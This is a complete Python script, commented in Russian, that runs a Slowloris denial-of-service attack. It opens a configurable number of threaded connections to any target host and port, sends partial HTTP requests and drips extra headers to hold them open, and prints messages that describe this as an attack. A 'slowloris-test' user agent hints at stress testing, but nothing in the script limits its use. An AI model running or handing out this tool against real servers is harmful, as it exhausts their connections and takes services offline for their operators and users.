import socket
import time
import random
import threading
import argparse
import customtkinter as ctk

# Функция, поддерживающая одно соединение
def slowloris_socket(target, port, interval):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target, port))
        print(f"[+] Подключено: {target}:{port}")

        # Отправляем неполный HTTP-запрос
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {target}\r\n".encode("utf-8"))
        s.send("User-Agent: slowloris-test\r\n".encode("utf-8"))
        s.send("Content-Length: 10000\r\n".encode("utf-8"))
        
        while True:
            # Отправляем один дополнительный заголовок, чтобы держать соединение открытым
            time.sleep(interval)
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                print("[>] Байт отправлен для поддержки соединения")
            except socket.error:
                print("[-] Соединение потеряно, выход из потока")
                break

    except Exception as e:
        print(f"[!] Ошибка: {e}")

# Основная функция
def main():
    parser = argparse.ArgumentParser(description="Slowloris в стиле slowhttptest")
    parser.add_argument("target", help="Целевой хост или IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Порт (по умолчанию 80)")
    parser.add_argument("-s", "--sockets", type=int, default=100, help="Количество одновременных соединений")
    parser.add_argument("-i", "--interval", type=int, default=10, help="Интервал между отправками байтов (сек)")

    args = parser.parse_args()

    print(f"[~] Атака на {args.target}:{args.port} через {args.sockets} соединений каждые {args.interval} сек.")

    threads = []
    for _ in range(args.sockets):
        t = threading.Thread(target=slowloris_socket, args=(args.target, args.port, args.interval))
        t.daemon = True  # Закроется при завершении главного потока
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Остановка атаки...")

if __name__ == "__main__":
    main()